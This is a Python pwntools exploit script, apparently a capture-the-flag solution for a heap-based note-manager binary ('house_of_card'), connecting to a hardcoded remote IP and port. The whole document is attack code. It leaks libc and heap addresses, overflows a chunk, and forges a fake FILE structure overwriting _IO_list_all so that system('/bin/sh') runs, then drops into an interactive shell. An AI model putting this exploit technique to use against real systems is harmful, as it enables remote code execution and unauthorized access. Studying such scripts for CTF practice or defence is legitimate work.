rom pwn import *

env = {
    'LD_PRELOAD': './libc.so'
}


r = remote('178.128.87.12', 31336 )
#r = process('./house_of_card_patch', env=env)
#raw_input('?')


def Add(name, length, des):
    r.recvuntil('\x20\x20\x20\x20\xE2\x9B\xA9\x20\x20\x20\x20')
    r.sendline('1')
    r.recvuntil('Name :')
    r.send(name)
    r.recvuntil('Len?')
    r.sendline(str(length))
    r.recvuntil('Description:\n')
    r.send(des)
    
def Del(index):
    r.recvuntil('\x20\x20\x20\x20\xE2\x9B\xA9\x20\x20\x20\x20')
    r.sendline('3')
    r.recvuntil('Back.\n>')
    r.sendline(str(index))

def Edit(index, name, length, des):
    r.recvuntil('\x20\x20\x20\x20\xE2\x9B\xA9\x20\x20\x20\x20')
    r.sendline('2')
    r.recvuntil('Back.\n>')
    r.sendline(str(index))
    r.recvuntil('New name?')
    r.send(name)
    r.recvuntil('Len?')
    r.sendline(str(length))
    r.send(des)


Add('Note 1\n', 0x180, 'a'*0x180)
Add('Note 2\n', 0x180, 'b'*0x180)
Add('Note 3\n', 0x180, '\n')
Add('Note 4\n', 0x180, '\n')
Add('Note 5\n', 0x180, '\n')
Add('Note 6\n', 0x180, '\n')
Add('Note 7\n', 0x180, '\n')
Add('Note 8\n', 0x180, '\n')
Add('Note 9\n', 0x180, '\n')
Add('Note 10\n', 0x180, '\n')
Add('Note 11\n', 0x180, '\n')
Add('Note 12\n', 0x180, '\n')
Add('Note 13\n', 0x180, '\n')
r.recvuntil('\x20\x20\x20\x20\xE2\x9B\xA9\x20\x20\x20\x20')
r.sendline('3')
r.recvuntil('Note 3\n')
r.recvuntil('Description :\n')
r.recv(10)
tmp = u64(r.recv(8))
log.info("tmp: %#x" %tmp)
base = tmp - 0x3c1cd8
log.info("base: %#x" %base)
system = base + 0x456a0
log.info("system: %#x" %system)
sh = base + 0x11eb0
log.info("sh: %#x" %sh)

r.sendline('14')
payload = 'a'*0x184+p64(0x21)+p64(tmp-0x178-0x44)
Edit(1, "Note 1 edited\n", 0x181, payload[:-1]+"\n")
r.recvuntil('\x20\x20\x20\x20\xE2\x9B\xA9\x20\x20\x20\x20')
r.sendline('3')
r.recvuntil('[13] Name :')
r.recvuntil('Description :\n')
r.recv(2)
heap = u64(r.recv(8))
log.info("heap: %#x" %heap)
r.sendline('14')
Del(7)
payload = p64(0)*2
payload += p64(0) #top[4]
payload += p64(0x7fffffffffff)
payload += p64(0)
payload += p64(0)
payload += p64((sh-0x64)/2)
payload += p64(0)*11
payload += p64(heap+0xb0)
payload += p64(0)*3
payload += p64(0x69)
payload += p64(0)
payload += p64(0x7fffffffffff)
payload += p64(base + 0x3be4c0) #_IO_str_jumps
payload += p64(system) #system

Add('Note 14\n', 0x100, payload+"\n")


payload = 'a'*0x184+p64(0x21)+p64(tmp-0x178-0x44)
payload += p64(0)
payload += p64(0x800) #0
payload += p64(0x61) 
payload += p64(base + 0x3c1b58)
payload += p64(base+0x3c24f0) #_IO_list_all
Edit(1, "Note 1 edited\n", 0x182, payload+"\n")

r.recvuntil('\x20\x20\x20\x20\xE2\x9B\xA9\x20\x20\x20\x20')
r.sendline('1')
r.recvuntil('Name :')
r.send('abc\n')
r.recvuntil('Len?')
r.sendline(str(128))
    
r.interactive()
